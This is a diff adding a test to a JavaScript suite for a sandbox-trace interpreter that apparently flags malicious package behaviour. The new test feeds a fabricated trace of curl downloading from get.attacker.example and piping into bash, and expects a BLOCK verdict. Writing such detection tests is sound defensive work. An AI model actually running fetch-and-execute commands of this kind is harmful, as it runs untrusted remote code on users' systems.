@@ -290,6 +290,16 @@ test('interprets a sandbox trace of a stealer', () => {
   assert.deepEqual(r.observed.dns, ['collect.attacker.example']);
 });
 
+test('spots curl piped into a shell in a trace', () => {
+  const traces = [[
+    '201 12:00:00.000001 execve("/usr/bin/curl", ["curl", "-fsSL", "https://get.attacker.example/b"], 0x0 /* 3 vars */) = 0',
+    '202 12:00:00.000002 execve("/usr/bin/bash", ["bash"], 0x0 /* 3 vars */) = 0',
+  ].join('\n')];
+  const r = interpret({ traces, net: [{ kind: 'dns', name: 'get.attacker.example' }], canary: 'X', phases: [], claudeAfter: '{"hooks":{}}' });
+  assert.equal(r.verdict, 'BLOCK');
+  assert.ok(r.findings.some(f => f.id === 'remote-exec'));
+});
+
 test('interprets a quiet trace as safe', () => {
   const traces = ['101 12:00:00.000001 openat(AT_FDCWD, "/work/pkg/index.js", O_RDONLY|O_CLOEXEC) = 21'];
   const r = interpret({ traces, net: [], canary: 'X', phases: [], claudeAfter: '{"hooks":{}}' });
